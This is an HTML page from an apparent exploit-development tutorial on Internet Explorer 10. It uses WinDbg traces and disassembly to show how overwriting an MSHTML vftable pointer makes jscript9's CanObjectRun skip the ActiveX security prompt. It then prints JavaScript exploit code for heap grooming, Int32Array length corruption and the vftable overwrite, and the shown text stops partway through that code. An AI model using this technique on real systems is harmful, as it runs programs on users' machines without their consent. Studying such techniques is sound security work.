@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IE10: God Mode (1)</title>
+    <link rel="stylesheet" href="styles.css">
+
+    <link rel="stylesheet" href="highlight/styles/stackoverflow-dark.min.css">
+    <script src="highlight/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<div class="inner-content"><header class="page-header"><h1 class="page-title">IE10: God Mode (1)</h1></header><div class="page-content"><p>When an html page tries to load and run an <span style="color: #00ccff;">ActiveX</span> object in IE, the user is alerted with a <span style="color: #00ccff;">dialog box</span>. For instance, create an html file with the following code:</p>
+
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  shell = new ActiveXObject("WScript.shell");
+  shell.Exec('calc.exe');
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>If you open this file in IE, you should get the following dialog box:</p><p>
+<a href="images/pic_27.png"><img src="images/pic_27.png" alt="pic_27" width="470" height="181"></a>
+<br> If we activate the so-called <span style="color: #00ccff;">God Mode</span>, IE runs the ActiveX object without asking for the user’s permission. Basically, we’ll just use our ability to read and write where we want to alter the behavior of IE.</p><p>But what’s so interesting in popping up a calculator? That’s a valid demonstration for general shellcode because it proves that we can run arbitrary code, but here we’ve just proved that we can execute any program which resides on the user’s hard disk. We’d like to execute arbitrary code, instead.</p><p>One solution is to create an <span style="color: #00ccff;">.exe</span> file containing code and data of our choosing and then execute it. But for now, let’s try to bypass the dialog box when executing the code above.</p><h2>Bypassing the dialog box</h2><p>The dialog box displayed when the code above is run looks like a regular Windows dialog box, so it’s likely that IE uses the <span style="color: #00ccff;">Windows API</span> to create it. Let’s search for <span style="color: #00ff00;">msdn dialog box</span> with <span style="color: #00ccff;">google</span>. The first result is this link:</p><p style="padding-left: 30px;"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms645452%28v=vs.85%29.aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms645452%28v=vs.85%29.aspx</a></p><p>As you can see in the following picture, there are a few functions used to create dialog boxes:</p><p>
+<a href="images/pic_28.png"><img src="images/pic_28.png" alt="pic_28" width="1692" height="905"></a>
+<br> By reading the <em>Remarks </em>section we discover that <span style="color: #00ff00;">DialogBox</span> calls <span style="color: #00ff00;">CreateWindowEx</span>:</p><p>
+<a href="images/pic_29.png"><img src="images/pic_29.png" alt="pic_29" width="1692" height="905"></a>
+<br> When we look at the other functions used to create dialog boxes, we find out that they also call <span style="color: #00ff00;">CreateWindowEx</span>, so we should put a breakpoint on <span style="color: #00ff00;">CreateWindowEx</span>.</p><p>First of all, we load the html page above in IE and, before allowing the blocked content (IE asks for a confirmation when you open local html files), we put a breakpoint on <span style="color: #00ff00;">CreateWindowEx</span> (both the <span style="color: #00ccff;">ASCII</span> and the <span style="color: #00ccff;">Unicode</span> version) in WinDbg:</p><pre class="ignore:true">  0:016&gt; bp createwindowexw
+  0:016&gt; bp createwindowexa</pre><p>Then, when we allow the blocked content, the breakpoint on <span style="color: #00ff00;">CreateWindowExW</span> is triggered. Here’s the stack trace:</p><pre class="ignore:true">0:007&gt; k 20
+ChildEBP RetAddr  
+042bae7c 738d4467 user32!CreateWindowExW
+042baebc 6eeee9fa IEShims!NS_HangResistanceInternal::APIHook_CreateWindowExW+0x64
+042baefc 6efb9759 IEFRAME!SHFusionCreateWindowEx+0x47
+042bb058 6efb951e IEFRAME!CBrowserFrameState::FindTabIDFromRootThreadID+0x13b
+042bb0a4 6efb9409 IEFRAME!UnifiedFrameAware_AcquireModalDialogLockAndParent+0xe9
+042bb0c4 738e8c5c IEFRAME!TabWindowExports::AcquireModalDialogLockAndParent+0x1b
+042bb0e0 74e7f0c8 IEShims!NS_UISuppression::APIHook_DialogBoxParamW+0x31
+042bb910 74e9efe0 urlmon!CSecurityManager::DisplayMessage+0x40
+042bbcb4 74dff5d4 urlmon!memset+0x120a0
+042bbcf8 6e2a84dc urlmon!CSecurityManager::ProcessUrlActionEx2+0x15f
+042bbd6c 6e2a81ae MSHTML!CMarkup::ProcessURLAction2+0x31d
+042bbd9c 6ecf7868 MSHTML!CMarkup::ProcessURLAction+0x3e
+042bbe28 6e24d87d MSHTML!memcpy+0x120f00
+042bbe6c 04d5c12d MSHTML!CDocument::HostQueryCustomPolicy+0x148
+042bbee4 04d5bfae jscript9!ScriptEngine::CanObjectRun+0x78   &lt;--------------------
+042bbf30 04d5bde1 jscript9!ScriptSite::CreateObjectFromProgID+0xdf   &lt;--------------------
+042bbf74 04d5bd69 jscript9!ScriptSite::CreateActiveXObject+0x56   &lt;--------------------
+042bbfa8 04cc25d5 jscript9!JavascriptActiveXObject::NewInstance+0x90
+042bc000 04cc272e jscript9!Js::InterpreterStackFrame::NewScObject_Helper+0xd6
+042bc194 04c95cf5 jscript9!Js::InterpreterStackFrame::Process+0x2c6d
+042bc29c 034b0fe9 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x305
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+042bc2a8 04c91f60 0x34b0fe9
+042bc328 04c920ca jscript9!Js::JavascriptFunction::CallRootFunction+0x140
+042bc340 04c9209f jscript9!Js::JavascriptFunction::CallRootFunction+0x19
+042bc388 04c92027 jscript9!ScriptSite::CallRootFunction+0x40
+042bc3b0 04d3df75 jscript9!ScriptSite::Execute+0x61
+042bc43c 04d3db57 jscript9!ScriptEngine::ExecutePendingScripts+0x1e9
+042bc4c4 04d3e0b7 jscript9!ScriptEngine::ParseScriptTextCore+0x2ad
+042bc518 6e37b60c jscript9!ScriptEngine::ParseScriptText+0x5b
+042bc550 6e37945d MSHTML!CActiveScriptHolder::ParseScriptText+0x42
+042bc5a0 6e36b52f MSHTML!CJScript9Holder::ParseScriptText+0x58
+042bc614 6e37c6a4 MSHTML!CScriptCollection::ParseScriptText+0x1f0</pre><p>Three lines look particularly interesting:</p><pre class="ignore:true">042bbee4 04d5bfae jscript9!ScriptEngine::CanObjectRun+0x78   &lt;--------------------
+042bbf30 04d5bde1 jscript9!ScriptSite::CreateObjectFromProgID+0xdf   &lt;--------------------
+042bbf74 04d5bd69 jscript9!ScriptSite::CreateActiveXObject+0x56   &lt;--------------------</pre><p>Maybe the function <span style="color: #00ff00;">CanObjectRun</span> decides if the ActiveX object can run? Let’s delete the previous breakpoints and put a breakpoint on <span style="color: #00ff00;">jscript9!ScriptSite::CreateActiveXObject</span>:</p><pre class="ignore:true">bp jscript9!ScriptSite::CreateActiveXObject</pre><p>When we reload the html page and allow the blocked content in IE, we break on <span style="color: #00ff00;">CreateActiveXObject</span>. Here’s the code:</p><pre class="ignore:true">jscript9!ScriptSite::CreateActiveXObject:
+04eebd8b 6a18            push    18h
+04eebd8d b81927eb04      mov     eax,offset jscript9!memset+0x2ac2 (04eb2719)
+04eebd92 e88752f2ff      call    jscript9!_EH_epilog3_GS (04e1101e)
+04eebd97 837d1000        cmp     dword ptr [ebp+10h],0
+04eebd9b 8b5d08          mov     ebx,dword ptr [ebp+8]
+04eebd9e 8b5b54          mov     ebx,dword ptr [ebx+54h]
+04eebda1 0f8571721600    jne     jscript9!memset+0xf9c1 (05053018)
+04eebda7 8bcb            mov     ecx,ebx
+04eebda9 8d75e8          lea     esi,[ebp-18h]
+04eebdac e8f4feffff      call    jscript9!AutoLeaveScriptPtr&lt;IDispatch&gt;::AutoLeaveScriptPtr&lt;IDispatch&gt; (04eebca5)
+04eebdb1 8365fc00        and     dword ptr [ebp-4],0
+04eebdb5 8365f000        and     dword ptr [ebp-10h],0 ss:002b:0446ba64=0446ba70
+04eebdb9 896df0          mov     dword ptr [ebp-10h],ebp
+04eebdbc 8d45dc          lea     eax,[ebp-24h]
+04eebdbf 50              push    eax
+04eebdc0 8b45f0          mov     eax,dword ptr [ebp-10h]
+04eebdc3 8bcb            mov     ecx,ebx
+04eebdc5 e87faaf9ff      call    jscript9!Js::LeaveScriptObject&lt;1,1&gt;::LeaveScriptObject&lt;1,1&gt; (04e86849)
+04eebdca 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
+04eebdcd 8bc6            mov     eax,esi
+04eebdcf c645fc01        mov     byte ptr [ebp-4],1
+04eebdd3 8b7508          mov     esi,dword ptr [ebp+8]
+04eebdd6 50              push    eax
+04eebdd7 ff7510          push    dword ptr [ebp+10h]
+04eebdda 8bd6            mov     edx,esi
+04eebddc e8ea000000      call    jscript9!ScriptSite::CreateObjectFromProgID (04eebecb)   &lt;---------------
+04eebde1 c645fc00        mov     byte ptr [ebp-4],0
+04eebde5 807de400        cmp     byte ptr [ebp-1Ch],0
+04eebde9 8bf8            mov     edi,eax</pre><p>If we step inside <span style="color: #00ff00;">jscript9!ScriptSite::CreateObjectFromProgID</span> we see the following code:</p><pre class="ignore:true">jscript9!ScriptSite::CreateObjectFromProgID:
+04eebecb 8bff            mov     edi,edi
+04eebecd 55              push    ebp
+04eebece 8bec            mov     ebp,esp
+04eebed0 83ec34          sub     esp,34h
+04eebed3 a144630a05      mov     eax,dword ptr [jscript9!__security_cookie (050a6344)]
+04eebed8 33c5            xor     eax,ebp
+04eebeda 8945fc          mov     dword ptr [ebp-4],eax
+04eebedd 53              push    ebx
+04eebede 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
+04eebee1 56              push    esi
+04eebee2 33c0            xor     eax,eax
+04eebee4 57              push    edi
+04eebee5 8b7d08          mov     edi,dword ptr [ebp+8]
+04eebee8 8bf2            mov     esi,edx
+04eebeea 8975dc          mov     dword ptr [ebp-24h],esi
+04eebeed 8945cc          mov     dword ptr [ebp-34h],eax
+04eebef0 897dd0          mov     dword ptr [ebp-30h],edi
+04eebef3 8945d4          mov     dword ptr [ebp-2Ch],eax
+04eebef6 8945d8          mov     dword ptr [ebp-28h],eax
+04eebef9 8945e8          mov     dword ptr [ebp-18h],eax
+04eebefc 85ff            test    edi,edi
+04eebefe 0f85e26a1600    jne     jscript9!memset+0xf390 (050529e6)
+04eebf04 8b4604          mov     eax,dword ptr [esi+4]
+04eebf07 e8d5000000      call    jscript9!ScriptEngine::InSafeMode (04eebfe1)
+04eebf0c 85c0            test    eax,eax
+04eebf0e 8d45ec          lea     eax,[ebp-14h]
+04eebf11 50              push    eax
+04eebf12 51              push    ecx
+04eebf13 0f84d86a1600    je      jscript9!memset+0xf39b (050529f1)
+04eebf19 ff1508400905    call    dword ptr [jscript9!_imp__CLSIDFromProgID (05094008)]
+04eebf1f 85c0            test    eax,eax
+04eebf21 0f88e867fcff    js      jscript9!ScriptSite::CreateObjectFromProgID+0xf6 (04eb270f)
+04eebf27 8d45ec          lea     eax,[ebp-14h]
+04eebf2a 50              push    eax
+04eebf2b 8b4604          mov     eax,dword ptr [esi+4]
+04eebf2e e8e2030000      call    jscript9!ScriptEngine::CanCreateObject (04eec315)   &lt;-----------------------
+04eebf33 85c0            test    eax,eax
+04eebf35 0f84d467fcff    je      jscript9!ScriptSite::CreateObjectFromProgID+0xf6 (04eb270f)</pre><p>If we keep stepping through the code, we get to <span style="color: #00ff00;">jscript9!ScriptEngine::CanCreateObject</span>. This function also looks interesting. For now, let’s note that it returns <span style="color: #00ff00;">1</span> (i.e. <span style="color: #00ff00;">EAX = 1</span>) in this case. We continue to step through the code:</p><pre class="ignore:true">04eebf3b 6a05            push    5
+04eebf3d 58              pop     eax
+04eebf3e 85ff            test    edi,edi
+04eebf40 0f85b66a1600    jne     jscript9!memset+0xf3a6 (050529fc)
+04eebf46 8d4de4          lea     ecx,[ebp-1Ch]
+04eebf49 51              push    ecx
+04eebf4a 68ac0fec04      push    offset jscript9!IID_IClassFactory (04ec0fac)
+04eebf4f ff75e8          push    dword ptr [ebp-18h]
+04eebf52 50              push    eax
+04eebf53 8d45ec          lea     eax,[ebp-14h]
+04eebf56 50              push    eax
+04eebf57 ff1504400905    call    dword ptr [jscript9!_imp__CoGetClassObject (05094004)]
+04eebf5d 85c0            test    eax,eax
+04eebf5f 0f88aa67fcff    js      jscript9!ScriptSite::CreateObjectFromProgID+0xf6 (04eb270f)
+04eebf65 8b45e4          mov     eax,dword ptr [ebp-1Ch]
+04eebf68 8b08            mov     ecx,dword ptr [eax]
+04eebf6a 8d55e0          lea     edx,[ebp-20h]
+04eebf6d 52              push    edx
+04eebf6e 68ccbfee04      push    offset jscript9!IID_IClassFactoryEx (04eebfcc)
+04eebf73 50              push    eax
+04eebf74 ff11            call    dword ptr [ecx]      ds:002b:040725f8={wshom!CClassFactory::QueryInterface (04080554)}
+04eebf76 85c0            test    eax,eax
+04eebf78 8b45e4          mov     eax,dword ptr [ebp-1Ch]
+04eebf7b 8b08            mov     ecx,dword ptr [eax]
+04eebf7d 0f89a76a1600    jns     jscript9!memset+0xf3d4 (05052a2a)
+04eebf83 53              push    ebx
+04eebf84 681c13e104      push    offset jscript9!IID_IUnknown (04e1131c)
+04eebf89 6a00            push    0
+04eebf8b 50              push    eax
+04eebf8c ff510c          call    dword ptr [ecx+0Ch]  ds:002b:04072604={wshom!CClassFactory::CreateInstance (04080613)}
+04eebf8f 8bf0            mov     esi,eax
+04eebf91 8b45e4          mov     eax,dword ptr [ebp-1Ch]
+04eebf94 8b08            mov     ecx,dword ptr [eax]
+04eebf96 50              push    eax
+04eebf97 ff5108          call    dword ptr [ecx+8]    ds:002b:04072600={wshom!CClassFactory::Release (04080909)}
+04eebf9a 85f6            test    esi,esi
+04eebf9c 7818            js      jscript9!ScriptSite::CreateObjectFromProgID+0xe3 (04eebfb6)
+04eebf9e 8b4ddc          mov     ecx,dword ptr [ebp-24h]
+04eebfa1 ff33            push    dword ptr [ebx]
+04eebfa3 8b4904          mov     ecx,dword ptr [ecx+4]
+04eebfa6 8d55ec          lea     edx,[ebp-14h]
+04eebfa9 e807010000      call    jscript9!ScriptEngine::CanObjectRun (04eec0b5)   &lt;----------------------
+04eebfae 85c0            test    eax,eax
+04eebfb0 0f8467a90800    je      jscript9!ScriptSite::CreateObjectFromProgID+0xfd (04f7691d)   &lt;---------------
+04eebfb6 8b4dfc          mov     ecx,dword ptr [ebp-4]
+04eebfb9 5f              pop     edi
+04eebfba 8bc6            mov     eax,esi
+04eebfbc 5e              pop     esi
+04eebfbd 33cd            xor     ecx,ebp
+04eebfbf 5b              pop     ebx
+04eebfc0 e87953f2ff      call    jscript9!__security_check_cookie (04e1133e)
+04eebfc5 c9              leave
+04eebfc6 c20800          ret     8</pre><p>Finally, we get to <span style="color: #00ff00;">jscript9!ScriptEngine::CanObjectRun</span>. When we step over it, the familiar dialog box pops up:</p><p>
+<a href="images/pic_27.png"><img src="images/pic_27.png" alt="pic_27" width="470" height="181"></a>
+<br> Let’s click on <span style="color: #00ff00;">Yes</span> and go back in WinDbg. We can see that <span style="color: #00ff00;">CanObjectRun</span> returned <span style="color: #00ff00;">1</span> (i.e <span style="color: #00ff00;">EAX = 1</span>). This means that the <span style="color: #00ff00;">je</span> at <span style="color: #00ff00;">04eebfb0</span> is not taken and <span style="color: #00ff00;">CreateObjectFromProgID</span> returns. We can see that the calculator pops up.</p><p>Now let’s put a breakpoint right at <span style="color: #00ff00;">04eebfae</span>, reload the page in IE and let’s see what happens if we click on <span style="color: #00ff00;">No</span> when the dialog box appears. Now <span style="color: #00ff00;">EAX</span> is <span style="color: #00ff00;">0</span> and <span style="color: #00ff00;">je</span> is taken. If we resume the execution, we can see that the calculator doesn’t pop up this time.</p><p>So, if we want to bypass the dialog box, we must force <span style="color: #00ff00;">CanObjectRun</span> to return <span style="color: #00ff00;">true</span> (i.e. <span style="color: #00ff00;">EAX != 0</span>). Unfortunately, we can’t modify the code because it resides on <em>read-only pages</em>. We’ll need to think of something else.</p><p>Let’s put a breakpoint on <span style="color: #00ff00;">jscript9!ScriptEngine::CanObjectRun</span> and reload the page in IE. This time, we’re stepping inside <span style="color: #00ff00;">CanObjectRun</span>:</p><pre class="ignore:true ">jscript9!ScriptEngine::CanObjectRun:
+04eec0b5 8bff            mov     edi,edi
+04eec0b7 55              push    ebp
+04eec0b8 8bec            mov     ebp,esp
+04eec0ba 83ec48          sub     esp,48h
+04eec0bd a144630a05      mov     eax,dword ptr [jscript9!__security_cookie (050a6344)]
+04eec0c2 33c5            xor     eax,ebp
+04eec0c4 8945f8          mov     dword ptr [ebp-8],eax
+04eec0c7 53              push    ebx
+04eec0c8 8b5d08          mov     ebx,dword ptr [ebp+8]
+04eec0cb 56              push    esi
+04eec0cc 57              push    edi
+04eec0cd 8bf9            mov     edi,ecx
+04eec0cf 8bf2            mov     esi,edx
+04eec0d1 8bc7            mov     eax,edi
+04eec0d3 8975cc          mov     dword ptr [ebp-34h],esi
+04eec0d6 e806ffffff      call    jscript9!ScriptEngine::InSafeMode (04eebfe1)
+04eec0db 85c0            test    eax,eax
+04eec0dd 0f844e581600    je      jscript9!memset+0xe3b4 (05051931)
+04eec0e3 f687e401000008  test    byte ptr [edi+1E4h],8
+04eec0ea 0f8450581600    je      jscript9!memset+0xe3c3 (05051940)
+04eec0f0 8d45bc          lea     eax,[ebp-44h]
+04eec0f3 50              push    eax
+04eec0f4 e87a020000      call    jscript9!ScriptEngine::GetSiteHostSecurityManagerNoRef (04eec373)
+04eec0f9 85c0            test    eax,eax
+04eec0fb 0f8838581600    js      jscript9!memset+0xe3bc (05051939)
+04eec101 8b45bc          mov     eax,dword ptr [ebp-44h]
+04eec104 8d7dd0          lea     edi,[ebp-30h]
+04eec107 a5              movs    dword ptr es:[edi],dword ptr [esi]
+04eec108 a5              movs    dword ptr es:[edi],dword ptr [esi]
+04eec109 a5              movs    dword ptr es:[edi],dword ptr [esi]
+04eec10a a5              movs    dword ptr es:[edi],dword ptr [esi]
+04eec10b 895de0          mov     dword ptr [ebp-20h],ebx
+04eec10e 33db            xor     ebx,ebx
+04eec110 53              push    ebx
+04eec111 6a18            push    18h
+04eec113 8d55d0          lea     edx,[ebp-30h]
+04eec116 52              push    edx
+04eec117 8d55cc          lea     edx,[ebp-34h]
+04eec11a 52              push    edx
+04eec11b 8d55c0          lea     edx,[ebp-40h]
+04eec11e 52              push    edx
+04eec11f 6868c1ee04      push    offset jscript9!GUID_CUSTOM_CONFIRMOBJECTSAFETY (04eec168)
+04eec124 895de4          mov     dword ptr [ebp-1Ch],ebx
+04eec127 8b08            mov     ecx,dword ptr [eax]
+04eec129 50              push    eax
+04eec12a ff5114          call    dword ptr [ecx+14h]  ds:002b:6ed255f4={MSHTML!TearoffThunk5 (6e1dafe5)}   &lt;--------------------------
+04eec12d 85c0            test    eax,eax
+04eec12f 0f8804581600    js      jscript9!memset+0xe3bc (05051939)
+04eec135 8b45c0          mov     eax,dword ptr [ebp-40h]
+04eec138 6a03            push    3</pre><p>When we step over the call at <span style="color: #00ff00;">04eec12a</span>, the familiar dialog box pops up. Let’s keep stepping:</p><pre class="ignore:true">04eec13a 5b              pop     ebx
+04eec13b 85c0            test    eax,eax
+04eec13d 740f            je      jscript9!ScriptEngine::CanObjectRun+0x99 (04eec14e)
+04eec13f 837dcc04        cmp     dword ptr [ebp-34h],4
+04eec143 7202            jb      jscript9!ScriptEngine::CanObjectRun+0x92 (04eec147)
+04eec145 8b18            mov     ebx,dword ptr [eax]
+04eec147 50              push    eax
+04eec148 ff151c400905    call    dword ptr [jscript9!_imp__CoTaskMemFree (0509401c)]
+04eec14e 6a00            push    0
+04eec150 f6c30f          test    bl,0Fh
+04eec153 58              pop     eax
+04eec154 0f94c0          sete    al
+04eec157 8b4df8          mov     ecx,dword ptr [ebp-8]
+04eec15a 5f              pop     edi
+04eec15b 5e              pop     esi
+04eec15c 33cd            xor     ecx,ebp
+04eec15e 5b              pop     ebx
+04eec15f e8da51f2ff      call    jscript9!__security_check_cookie (04e1133e)
+04eec164 c9              leave
+04eec165 c20400          ret     4</pre><p>Finally, <span style="color: #00ff00;">CanObjectRun</span> returns.</p><p>Let’s look again at the following three lines of code:</p><pre class="ignore:true">04eec127 8b08            mov     ecx,dword ptr [eax]      ; ecx = vftable pointer
+04eec129 50              push    eax
+04eec12a ff5114          call    dword ptr [ecx+14h]  ds:002b:6ed255f4={MSHTML!TearoffThunk5 (6e1dafe5)}</pre><p>It’s pretty clear that the first line reads the <span style="color: #00ccff;">vftable</span> pointer from the first dword of the object pointed to by <span style="color: #00ff00;">eax</span> and that, finally, the third instruction calls the 6th virtual function (offset <span style="color: #00ff00;">14h</span>) in the vftable. Since all vftables are located at fixed <span style="color: #00ccff;">RVAs</span>, we can locate and modify this vftable so that we can call whetever code we want.</p><p>Right before the <span style="color: #00ff00;">call</span> at <span style="color: #00ff00;">04eec12a</span>, <span style="color: #00ff00;">eax</span> is clearly non zero, so, if we were to return immediately from <span style="color: #00ff00;">CanObjectRun</span>, <span style="color: #00ff00;">CanObjectRun</span> would return <span style="color: #00ff00;">true</span>. What happens if we overwrite the 6th pointer of the vftable with the value <span style="color: #00ff00;">04eec164</span>?</p><p>What happens is that the call at <span style="color: #00ff00;">04eec127</span> will call the <span style="color: #00ccff;">epilog</span> of <span style="color: #00ff00;">CanObjectRun</span> so <span style="color: #00ff00;">CanObjectRun</span> will end and return true. Everything works correctly because, even if the call at <span style="color: #00ff00;">04eec127</span> push a <span style="color: #00ff00;">ret eip</span> on the stack, the epilog of <span style="color: #00ff00;">CanObjectRun</span> will restore <span style="color: #00ff00;">esp</span> to the correct value. Remember that <span style="color: #00ff00;">leave</span> is equivalent to the following two instructions:</p><pre class="ignore:true">mov   esp, ebp
+pop   ebp</pre><p>Let’s put a breakpoint at <span style="color: #00ff00;">04eec12a</span>, reload the page in IE and, when the breakpoint is triggered, examine the vftable:</p><pre class="ignore:true">0:007&gt; ln ecx
+(6ed255e0)   MSHTML!s_apfnPlainTearoffVtable   |  (6ed25ce8)   MSHTML!s_apfnEmbeddedDocTearoffVtable
+Exact matches:
+    MSHTML!s_apfnPlainTearoffVtable = &lt;no type information&gt;
+0:007&gt; dds ecx
+6ed255e0  6e162681 MSHTML!PlainQueryInterface
+6ed255e4  6e1625a1 MSHTML!CAPProcessor::AddRef
+6ed255e8  6e13609d MSHTML!PlainRelease
+6ed255ec  6e128eb5 MSHTML!TearoffThunk3
+6ed255f0  6e30604a MSHTML!TearoffThunk4
+6ed255f4  6e1dafe5 MSHTML!TearoffThunk5    &lt;----------- we want to overwrite this
+6ed255f8  6e1d9a77 MSHTML!TearoffThunk6
+6ed255fc  6e2b1a73 MSHTML!TearoffThunk7
+6ed25600  6e1d770c MSHTML!TearoffThunk8
+6ed25604  6e1db22c MSHTML!TearoffThunk9
+6ed25608  6e1db1e3 MSHTML!TearoffThunk10
+6ed2560c  6e307db5 MSHTML!TearoffThunk11
+6ed25610  6e1db2b8 MSHTML!TearoffThunk12
+6ed25614  6e3e2a3d MSHTML!TearoffThunk13
+6ed25618  6e2f2719 MSHTML!TearoffThunk14
+6ed2561c  6e304879 MSHTML!TearoffThunk15
+6ed25620  6e1db637 MSHTML!TearoffThunk16
+6ed25624  6e1e1bf3 MSHTML!TearoffThunk17
+6ed25628  6e1d9649 MSHTML!TearoffThunk18
+6ed2562c  6e558422 MSHTML!TearoffThunk19
+6ed25630  6e63bc4a MSHTML!TearoffThunk20
+6ed25634  6e1e16d9 MSHTML!TearoffThunk21
+6ed25638  6e397b23 MSHTML!TearoffThunk22
+6ed2563c  6e2c2734 MSHTML!TearoffThunk23
+6ed25640  6e3975ed MSHTML!TearoffThunk24
+6ed25644  6e5728c5 MSHTML!TearoffThunk25
+6ed25648  6e475a7d MSHTML!TearoffThunk26
+6ed2564c  6e456310 MSHTML!TearoffThunk27
+6ed25650  6e46ff2d MSHTML!TearoffThunk28
+6ed25654  6e45a803 MSHTML!TearoffThunk29
+6ed25658  6e47d81a MSHTML!TearoffThunk30
+6ed2565c  6e2d3f19 MSHTML!TearoffThunk31</pre><p>Determining the RVA of the vftable is quite easy:</p><pre class="ignore:true">0:007&gt; ? MSHTML!s_apfnPlainTearoffVtable-mshtml
+Evaluate expression: 12932576 = 00c555e0</pre><p>Now let’s find the RVA of the epilog at <span style="color: #00ff00;">04eec164</span>:</p><pre class="ignore:true">0:007&gt; !address 04eec164
+
+                                     
+Mapping file section regions...
+Mapping module regions...
+Mapping PEB regions...
+Mapping TEB and stack regions...
+Mapping heap regions...
+Mapping page heap regions...
+Mapping other regions...
+Mapping stack trace database regions...
+Mapping activation context regions...
+
+
+Usage:                  Image
+Base Address:           04e11000
+End Address:            05094000
+Region Size:            00283000
+State:                  00001000  MEM_COMMIT
+Protect:                00000020  PAGE_EXECUTE_READ
+Type:                   01000000  MEM_IMAGE
+Allocation Base:        04e10000
+Allocation Protect:     00000080  PAGE_EXECUTE_WRITECOPY
+Image Path:             C:\Windows\SysWOW64\jscript9.dll
+Module Name:            jscript9      &lt;----------------------------------------------
+Loaded Image Name:      C:\Windows\SysWOW64\jscript9.dll
+Mapped Image Name:      
+More info:              lmv m jscript9
+More info:              !lmi jscript9
+More info:              ln 0x4eec164
+More info:              !dh 0x4e10000
+
+
+0:007&gt; ? 04eec164-jscript9
+Evaluate expression: 901476 = 000dc164</pre><p>So the vftable is at <span style="color: #00ff00;">mshtml + 0xc555e0</span> and we need to overwrite the dword at <span style="color: #00ff00;">mshtml + 0xc555e0 + 0x14</span> with the value <span style="color: #00ff00;">jscript9 + 0xdc164</span>. Let’s see the javascript code to do this:</p>
+
+<pre><code class="language-js">    // We want to overwrite mshtml+0xc555e0+0x14 with jscript9+0xdc164 where:
+    //   * mshtml+0xc555e0 is the address of the vftable we want to modify;
+    //   * jscript9+0xdc164 points to the code "leave / ret 4".
+    // As a result, jscript9!ScriptEngine::CanObjectRun returns true.
+
+    var old = read(mshtml+0xc555e0+0x14);
+    write(mshtml+0xc555e0+0x14, jscript9+0xdc164);      // God mode on!
+    
+    shell = new ActiveXObject("WScript.shell");
+    shell.Exec('calc.exe');
+
+    write(mshtml+0xc555e0+0x14, old);      // God mode off!
+</code></pre>
+    
+    <p>Note that the code restores the vftable as soon as possible (<span style="color: #00ff00;">God mode off!</span>) because the altered vftable would lead to a crash in the long run.</p><p>Here’s the <a href="code/ie10_code1.zip">full code</a>:</p>
+    
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;script language="javascript"&gt;
+  (function() {
+    alert("Starting!");
+
+    //-----------------------------------------------------
+    // From one-byte-write to full process space read/write
+    //-----------------------------------------------------
+ 
+    a = new Array();
+ 
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // 8-byte header | 0x58-byte ArrayBuffer (buf)
+    // 8-byte header | 0x58-byte LargeHeapBlock
+    // .
+    // .
+    // .
+    for (i = 0; i &lt; 0x200; ++i) {
+      a[i] = new Array(0x3c00);
+      if (i == 0x80)
+        buf = new ArrayBuffer(0x58);      // must be exactly 0x58!
+      for (j = 0; j &lt; a[i].length; ++j)
+        a[i][j] = 0x123;
+    }
+    
+    //    0x0:  ArrayDataHead
+    //   0x20:  array[0] address
+    //   0x24:  array[1] address
+    //   ...
+    // 0xf000:  Int32Array
+    // 0xf030:  Int32Array
+    //   ...
+    // 0xffc0:  Int32Array
+    // 0xfff0:  align data
+    for (; i &lt; 0x200 + 0x400; ++i) {
+      a[i] = new Array(0x3bf8)
+      for (j = 0; j &lt; 0x55; ++j)
+        a[i][j] = new Int32Array(buf)
+    }
+    
+    //            vftptr
+    // 0c0af000: 70583b60 031c98a0 00000000 00000003 00000004 00000000 20000016 08ce0020
+    // 0c0af020: 03133de0                                             array_len buf_addr
+    //          jsArrayBuf
+    alert("Set byte at 0c0af01b to 0x20");
+    
+    // Now let's find the Int32Array whose length we modified.
+    int32array = 0;
+    for (i = 0x200; i &lt; 0x200 + 0x400; ++i) {
+      for (j = 0; j &lt; 0x55; ++j) {
+        if (a[i][j].length != 0x58/4) {
+          int32array = a[i][j];
+          break;
+        }
+      }
+      if (int32array != 0)
+        break;
+    }
+    
+    if (int32array == 0) {
+      alert("Can't find int32array!");
+      window.location.reload();
+      return;
+    }
+ 
+    // This is just an example.
+    // The buffer of int32array starts at 03c1f178 and is 0x58 bytes.
+    // The next LargeHeapBlock, preceded by 8 bytes of header, starts at 03c1f1d8.
+    // The value in parentheses, at 03c1f178+0x60+0x24, points to the following
+    // LargeHeapBlock.
+    //
+    // 03c1f178: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f198: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+    // 03c1f1b8: 00000000 00000000 00000000 00000000 00000000 00000000 014829e8 8c000000
+    // 03c1f1d8: 70796e18 00000003 08100000 00000010 00000001 00000000 00000004 0810f020
+    // 03c1f1f8: 08110000(03c1f238)00000000 00000001 00000001 00000000 03c15b40 08100000
+    // 03c1f218: 00000000 00000000 00000000 00000004 00000001 00000000 01482994 8c000000
+    // 03c1f238: ...
+
+    // We check that the structure above is correct (we check the first LargeHeapBlocks).
+    // 70796e18 = jscript9!LargeHeapBlock::`vftable' = jscript9 + 0x6e18
+    var vftptr1 = int32array[0x60/4],
+        vftptr2 = int32array[0x60*2/4],
+        vftptr3 = int32array[0x60*3/4],
+        nextPtr1 = int32array[(0x60+0x24)/4],
+        nextPtr2 = int32array[(0x60*2+0x24)/4],
+        nextPtr3 = int32array[(0x60*3+0x24)/4];
+    if (vftptr1 &amp; 0xffff != 0x6e18 || vftptr1 != vftptr2 || vftptr2 != vftptr3 ||
+        nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
+      alert("Error!");
+      window.location.reload();
+      return;
